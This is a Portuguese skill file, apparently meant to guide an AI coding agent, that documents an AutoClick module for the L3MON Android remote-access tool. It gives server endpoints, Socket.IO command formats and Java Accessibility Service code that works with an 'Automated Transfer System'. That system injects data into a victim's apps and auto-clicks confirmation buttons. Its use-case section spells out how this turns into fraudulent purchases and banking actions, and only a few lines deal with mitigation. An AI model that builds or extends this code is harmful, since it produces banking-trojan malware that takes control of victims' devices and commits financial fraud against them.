# Skill: Automação de Clique em Botões - L3MON AutoClick

## Visão Geral

O **AutoClick** é um componente automático de confirmação que detecta e clica em botões de envio/confirmação após o preenchimento automático de dados. Funciona em conjunto com o **ATS (Automated Transfer System)** para criar um fluxo de ataque completo: injeção de dados fictícios + clique automático de confirmação.

**Velocidade de Execução:** O processo ocorre em frações de segundo (100-500ms típicamente).

---

## Arquitetura

### Stack Tecnológico

| Camada | Tecnologia | Responsabilidade |
|--------|-----------|------------------|
| **Servidor Web** | Express.js + Node.js | Gerencia configuração, padrões e logging |
| **Comunicação** | Socket.IO | Envia comandos e recebe confirmações |
| **Cliente Android** | Accessibility Service API | Detecta e clica botões via AccessibilityNodeInfo |
| **Persistência** | lowdb + JSON | Armazena padrões de botão por cliente |

### Fluxo de Automação

```
1. Usuário ativa AutoClick no gerenciador
2. Sistema configura padrões de botão (ex: "enviar", "confirmar")
3. ATS preenche campos com dados fictícios
4. AutoClick detecta botão recursivamente na árvore de nós
5. Quando padrão encontra match: ACTION_CLICK é disparado
6. Botão é clicado automaticamente
7. Operação é registrada no log de auditoria
```

---

## Configuração do Servidor

### 1. Banco de Dados - `databaseGateway.js`

**Extensão do `atsConfig`:**

```javascript
atsConfig: {
    enabled: false,
    autoClickEnabled: false,              // Novo
    clickDelayMs: 500,                    // Novo - delay em ms
    dataMapping: { /* dados fictícios */ },
    fieldPatterns: [ /* padrões de campos */ ],
    buttonPatterns: [                     // Novo - padrões de botão
        'enviar', 'send', 'submit', 'confirmar', 'confirm',
        'ok', 'continuar', 'continue', 'proximo', 'next',
        'avancar', 'forward', 'realizar', 'efetuar', 'fazer'
    ],
    atsLog: []
}
```

**Campos Novos:**
- `autoClickEnabled` (boolean): Se AutoClick está ativo
- `clickDelayMs` (number): Milissegundos de espera antes de clicar
- `buttonPatterns` (array): Palavras-chave que identificam botões

### 2. Manager - `atsManager.js`

**Novos Métodos:**

```javascript
/**
 * Habilita/desabilita auto-click
 * @param {string} clientID - ID do cliente
 * @param {boolean} enabled - Estado desejado
 * @param {function} callback - Função de retorno
 */
setAutoClickEnabled(clientID, enabled, callback)

/**
 * Define delay antes do clique
 * @param {string} clientID - ID do cliente
 * @param {number} delayMs - Delay em milissegundos
 * @param {function} callback - Função de retorno
 */
setClickDelay(clientID, delayMs, callback)

/**
 * Adiciona padrão de botão a detectar
 * @param {string} clientID - ID do cliente
 * @param {string} pattern - Palavra-chave do padrão
 * @param {function} callback - Função de retorno
 */
addButtonPattern(clientID, pattern, callback)

/**
 * Remove padrão de botão
 * @param {string} clientID - ID do cliente
 * @param {string} pattern - Palavra-chave a remover
 * @param {function} callback - Função de retorno
 */
removeButtonPattern(clientID, pattern, callback)
```

### 3. Rotas Express - `expressRoutes.js`

**Novos Endpoints:**

```javascript
// Habilita/desabilita auto-click
POST /manage/:deviceid/ats/autoclick/enable/:enabled
// Parâmetros: enabled = true|false

// Define delay antes do clique
POST /manage/:deviceid/ats/autoclick/delay/:delayMs
// Parâmetros: delayMs = número em ms (0-5000)

// Adiciona padrão de botão
POST /manage/:deviceid/ats/buttonpattern?pattern=enviar
// Body: pattern=enviar (URL encoded)

// Remove padrão de botão
DELETE /manage/:deviceid/ats/buttonpattern/:pattern
// Parâmetros: pattern = padrão a remover
```

### 4. Cliente Manager - `clientManager.js`

**Listener Socket.IO:**

```javascript
socket.on(CONST.messageKeys.autoClick, (data) => {
    if (data && data.buttonClicked) {
        logManager.log(CONST.logTypes.info, 
            clientID + " Auto Click: " + data.buttonText);
        
        // Registra operação de clique no log ATS
        let atsConfig = clientDB.get('atsConfig').value();
        atsConfig.atsLog.push({
            type: 'auto_click',
            buttonText: data.buttonText,
            timestamp: new Date(),
            success: data.buttonClicked === true
        });
    }
});
```

---

## Implementação Android

### 1. Detecção e Clique - `AccessibilityCaptureService.java`

**Método Principal:**

```java
/**
 * Encontra e clica automaticamente em botão de confirmação/envio
 * @param root - AccessibilityNodeInfo raiz
 * @param buttonPatterns - Array de palavras-chave a buscar
 * @param delayMs - Milissegundos a esperar antes de clicar
 * @return true se clique foi bem-sucedido
 */
public boolean findAndClickConfirmationButton(AccessibilityNodeInfo root, 
                                               String[] buttonPatterns, 
                                               int delayMs)
```

**Algoritmo de Busca:**

```java
private boolean findAndClickButtonRecursive(AccessibilityNodeInfo node, 
                                             String[] buttonPatterns) {
    if (node.isClickable()) {
        String text = node.getText().toString().toLowerCase();
        String description = node.getContentDescription().toString().toLowerCase();
        String viewId = node.getViewIdResourceName().toLowerCase();
        String combined = text + " " + description + " " + viewId;
        
        // Verifica cada padrão
        for (String pattern : buttonPatterns) {
            if (combined.contains(pattern.toLowerCase())) {
                // ENCONTROU! Clica no botão
                boolean clicked = node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                
                // Registra operação
                publishSnapshot(logEntry);
                
                return clicked;
            }
        }
    }
    
    // Busca recursivamente em filhos
    for (int i = 0; i < node.getChildCount(); i++) {
        AccessibilityNodeInfo child = node.getChild(i);
        if (findAndClickButtonRecursive(child, buttonPatterns)) {
            return true;
        }
    }
    
    return false;
}
```

**Integração com ATS:**

```java
/**
 * Automação completa: injeta dados + clica botão
 */
public void performATSAutomationWithAutoClick(AccessibilityNodeInfo root,
                                              String[] buttonPatterns,
                                              int clickDelayMs) {
    // 1. Injeta dados fictícios
    performATSAutomation(root);
    
    // 2. Aguarda delay configurado
    Thread.sleep(clickDelayMs);
    
    // 3. Clica em botão de confirmação
    findAndClickConfirmationButton(root, buttonPatterns, 0);
}
```

### 2. Handlers Socket.IO - `ConnectionManager.java`

**Comando 0xAC Estendido:**

```java
public static void AC(JSONObject data) {
    if (data.has("action") && "button_pattern_click".equals(data.getString("action"))) {
        ACAutoClickWithPatterns(data);  // Auto-click com padrões
    } else {
        GestureManager.executeGesture(context, data);  // Gesto tradicional
    }
}

public static void ACAutoClickWithPatterns(JSONObject data) {
    // Extrai padrões e delay
    String[] buttonPatterns = extrairPadroesDeData(data);
    int clickDelayMs = data.optInt("clickDelayMs", 500);
    
    // Executa auto-click
    service.findAndClickConfirmationButton(root, buttonPatterns, clickDelayMs);
}
```

**Ação ATS Estendida:**

```java
public static void AT(JSONObject data) {
    String action = data.optString("action", "enable");
    
    if ("activateWithAutoClick".equals(action)) {
        ATWithAutoClick(data);  // ATS + clique automático
    }
}

public static void ATWithAutoClick(JSONObject data) {
    // 1. Injeta dados fictícios automaticamente
    performATSAutomation(root);
    
    // 2. Clica botão de confirmação automaticamente
    String[] buttonPatterns = extrairPadroesDeData(data);
    service.findAndClickConfirmationButton(root, buttonPatterns, clickDelayMs);
}
```

---

## Interface Web - `ats.ejs`

### Componentes Visuais

**1. Toggle AutoClick:**
```html
<div class="ui toggle checkbox">
    <input type="checkbox" id="autoClickEnabled">
    <label>Auto-click <span id="autoClickStatus">Desabilitado</span></label>
</div>
```

**2. Controle de Delay:**
```html
<input type="number" id="clickDelayMs" min="0" max="5000" step="100" value="500">
<small>Tempo em milissegundos entre injetar dados e clicar</small>
```

**3. Gerenciamento de Padrões:**
```html
<div id="buttonPatternsList"><!-- Lista dinâmica --></div>
<input type="text" name="pattern" placeholder="ex: enviar, confirmar">
<button onclick="addButtonPattern()">Adicionar Padrão</button>
```

**4. Botão de Teste:**
```html
<button class="ui mini primary button" onclick="testAutoClick()">Testar Agora</button>
```

### Funções JavaScript

```javascript
// Atualiza status do auto-click
updateAutoClickStatus(enabled)

// Atualiza lista de padrões de botão
updateButtonPatternsList(buttonPatterns)

// Adiciona novo padrão
addButtonPattern()

// Remove padrão
removeButtonPattern(pattern)

// Atualiza delay
updateClickDelay()

// Envia comando de teste
testAutoClick()
```

---

## Protocolo de Mensagens

### Comando Auto-Click (0xAC)

**Simples - Gesto tradicional:**
```json
{
    "type": "0xAC",
    "gesture": { "x": 100, "y": 200 }
}
```

**Auto-Click com Padrões:**
```json
{
    "type": "0xAC",
    "action": "button_pattern_click",
    "buttonPatterns": ["enviar", "confirmar", "submit"],
    "clickDelayMs": 500
}
```

### Resposta do Cliente

**Sucesso:**
```json
{
    "buttonClicked": true,
    "buttonText": "Enviar",
    "timestamp": 1634567890000
}
```

**Erro:**
```json
{
    "buttonClicked": false,
    "error": "Botão não encontrado"
}
```

### Comando ATS com Auto-Click (0xAT)

**Ativação Completa:**
```json
{
    "type": "0xAT",
    "action": "activateWithAutoClick",
    "buttonPatterns": ["enviar", "confirmar"],
    "clickDelayMs": 500
}
```

---

## Padrões de Botão Suportados

### Padrões Padrão Inclusos

| Português | English | Descrição |
|-----------|---------|-----------|
| enviar | send | Botão de enviar mensagem |
| confirmar | confirm | Confirmação de ação |
| continuar | continue | Avançar no fluxo |
| próximo | next | Próxima etapa |
| avançar | forward | Avançar |
| OK | ok | Confirmação simples |
| realizar | execute | Executar ação |
| efetuar | perform | Realizar operação |
| fazer | submit | Submeter formulário |
| aceitar | accept | Aceitar termos |

### Adicionando Padrões Customizados

1. **Via UI:** Digite novo padrão no campo de entrada
2. **Via API:**
   ```bash
   POST /manage/:deviceid/ats/buttonpattern?pattern=customizado
   ```
3. **No Cliente:** Se implementar localmente

**Recomendações:**
- Use palavras-chave significativas (não "btn", "v", etc.)
- Evite palavras muito genéricas ("a", "e", etc.)
- Teste padrões em diversos aplicativos
- Padrões são case-insensitive

---

## Comportamento e Limitações

### Funcionamento

✅ **O que funciona:**
- Detecta botões por texto visível
- Detecta botões por content description
- Detecta botões por ID de recurso
- Busca recursiva em hierarquia profunda
- Funciona com múltiplos padrões simultâneos
- Registra cada clique em auditoria

❌ **Limitações:**
- Não funciona se Accessibility Service está desabilitado
- Botões invisible/hidden não são clicados
- Padrões devem estar no texto, description ou viewId
- Não pode usar OCR (visão computacional)
- Respeita permissões do Android Accessibility

### Timing e Síncronia

**Delay Padrão:** 500ms entre injeção de dados e clique

**Por quê?**
- Garante que dados foram processados
- Evita race conditions
- Permite aplicativo atualizar UI

**Configurável:** 0-5000ms (recomendado 200-1000ms)

---

## Auditoria e Logging

### Eventos Registrados

Cada operação de clique registra:
```json
{
    "type": "auto_click",
    "buttonText": "Enviar",
    "timestamp": "2024-01-15T10:30:45.123Z",
    "success": true,
    "pattern": "enviar"
}
```

### Log de Auditoria

Acessível via:
- **UI:** Página ATS → Log de Operações
- **API:** `GET /manage/:deviceid/ats/log`
- **Banco:** `clientDB['atsConfig']['atsLog']`

---

## Casos de Uso

### Atacante Desejado

```
1. Ativa ATS com dados fictícios de cartão de crédito
2. Ativa AutoClick com padrão "confirmar"
3. Espera vítima acessar app de e-commerce
4. ATS injeta dados fictícios quando usuário tenta pagar
5. AutoClick clica automaticamente em "Confirmar Compra"
6. Transação é processada com dados fraudulentos
7. Log registra exatamente quando/como tudo aconteceu
```

### Automação Completa

```
// Via Socket.IO - Atacante controla tudo
{
    "type": "0xAT",
    "action": "activateWithAutoClick",
    "buttonPatterns": ["comprar", "confirmar", "checkout", "pagar"],
    "clickDelayMs": 750
}
```

---

## Integração com Fluxo ATS Completo

```
┌─────────────────────────────────────────┐
│ 1. Usuário Abre App (ex: Banking)       │
└──────────────┬──────────────────────────┘
               ↓
┌─────────────────────────────────────────┐
│ 2. ATS Detecta Campo "Senha"            │
│    Injeta: "SenhaFictica123!"           │
└──────────────┬──────────────────────────┘
               ↓
        [Aguarda 500ms]
               ↓
┌─────────────────────────────────────────┐
│ 3. AutoClick Detecta Botão "Login"      │
│    Clica automaticamente                 │
└──────────────┬──────────────────────────┘
               ↓
┌─────────────────────────────────────────┐
│ 4. App Processa Login com dados Falsos  │
│    Transação/Ação Fraudulenta Executada │
└──────────────┬──────────────────────────┘
               ↓
┌─────────────────────────────────────────┐
│ 5. Log Registra Tudo para Auditoria     │
│    - Dados injetados                    │
│    - Botão clicado                      │
│    - Timestamp exato                    │
│    - Status sucesso/falha               │
└─────────────────────────────────────────┘
```

---

## API Completa

### Servidor

| Endpoint | Método | Descrição |
|----------|--------|-----------|
| `/ats/autoclick/enable/:enabled` | POST | Ativa/desativa AutoClick |
| `/ats/autoclick/delay/:delayMs` | POST | Configura delay |
| `/ats/buttonpattern` | POST | Adiciona padrão |
| `/ats/buttonpattern/:pattern` | DELETE | Remove padrão |
| `/ats` | GET | Retorna config (inclui autoClick) |

### Cliente Android

| Método | Parâmetros | Descrição |
|--------|-----------|-----------|
| `findAndClickConfirmationButton()` | root, buttonPatterns[], delayMs | Detecta e clica botão |
| `findAndClickButtonRecursive()` | node, buttonPatterns[] | Busca recursiva |
| `performATSAutomationWithAutoClick()` | root, buttonPatterns[], delayMs | Injeção + clique |
| `ACAutoClickWithPatterns()` | JSONObject data | Handler Socket.IO para 0xAC |
| `ATWithAutoClick()` | JSONObject data | Handler Socket.IO para ATS+click |

---

## Debugging e Testes

### Teste Manual via UI

1. Abra página ATS no gerenciador
2. Habilite AutoClick
3. Configure delay: 500ms
4. Adicione padrões: "enviar", "confirmar"
5. Clique "Testar Agora"
6. Verifique logs para resultado

### Verificar Padrões

```bash
# Obter configuração incluindo buttonPatterns
curl http://localhost:22533/manage/DEVICE_ID/ats

# Deve retornar:
# { "autoClickEnabled": true, "buttonPatterns": [...], ... }
```

### Logs de Erro Comuns

| Erro | Causa | Solução |
|------|-------|---------|
| "Botão não encontrado" | Padrão não encontra match | Verificar padrão vs. texto real |
| "Accessibility Service desabilitado" | Serviço não ativo | Reabilitar em Acessibilidade |
| "Timeout esperando clique" | Botão não reagiu | Aumentar delay |
| "Node null" | Janela ativa mudou | Retry automático |

---

## Segurança e Impacto

### Risco

🔴 **CRÍTICO** - Este componente automatiza completamente o fluxo fraudulento:
- Elimina necessidade de interação humana do atacante
- Executa em velocidade imperceptível ao usuário
- Deixa rastro de auditoria que pode ser analisado

### Mitigação

- Monitorar padrões de clique anormais
- Verificar se cliques correspondem a ações do usuário
- Auditar logs para padrões de automação
- Usar CAPTCHAs antes de ações críticas

---

## Histórico de Desenvolvimento

| Versão | Data | Mudanças |
|--------|------|----------|
| 1.0 | 2024-01 | Implementação inicial de AutoClick |
| 1.0 | 2024-01 | Integração com ATS |
| 1.0 | 2024-01 | UI e endpoints para gerenciamento |

---

## Documentação Relacionada

- [AGENTS.md](../../AGENTS.md) - Visão geral do L3MON
- [.github/skills/l3mon-ats-system/SKILL.md](./../l3mon-ats-system/SKILL.md) - Sistem ATS
- [.github/skills/l3mon-settext/SKILL.md](./../l3mon-settext/SKILL.md) - Injeção de texto SetText
